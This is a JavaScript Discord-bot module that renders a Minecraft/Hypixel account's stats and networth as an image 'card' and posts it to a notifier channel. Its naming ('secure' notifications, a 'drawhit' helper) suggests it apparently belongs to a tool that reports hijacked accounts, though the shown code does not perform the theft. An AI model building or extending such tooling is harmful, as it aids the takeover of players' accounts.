const { AttachmentBuilder } = require('discord.js');
const { makeCard } = require('../drawhit');
const config = require('../../../config.json');
const path = require('path');
const fs = require('fs');
const { startFolderMonitor } = require('../autocleaner');
const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');

async function sendSecureNotification(client, accountData) {
    try {
        if (!config.notifierChannel || config.notifierChannel === '') {
            return;
        }

        const mainBotClient = getMainBotClient();
        if (!mainBotClient || !mainBotClient.channels) {
            return;
        }
        
        const channel = await mainBotClient.channels.fetch(config.notifierChannel).catch(() => null);
        if (!channel) {
            return;
        }

        const stats = {
            username: accountData.username || 'Unknown',
            networth: accountData.networth || '0',
            bedwars: accountData.bedwars || '0',
            networkLevel: accountData.networkLevel || '0',
            sbLevel: accountData.sbLevel || '0',
            duelKDR: accountData.duelKDR || '0',
            duelWinstreak: accountData.duelWinstreak || '0',
            plusColour: accountData.plusColour || 'None',
            gifted: accountData.gifted || '0'
        };

        const timestamp = Date.now();
        const filename = `secure_${accountData.username}_${timestamp}.png`;
        const outputPath = path.join(__dirname, 'temp', filename);

        const tempDir = path.join(__dirname, 'temp');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
            startFolderMonitor(tempDir, 5);
        }

        const imageBuffer = await makeCard(stats, outputPath);
        const attachment = new AttachmentBuilder(imageBuffer, { name: filename });

        await channel.send({
            files: [attachment]
        });

    } catch (error) {
        console.error('[NOTIFIER] Failed to send secure notification:', error);
    }
}

module.exports = { sendSecureNotification };
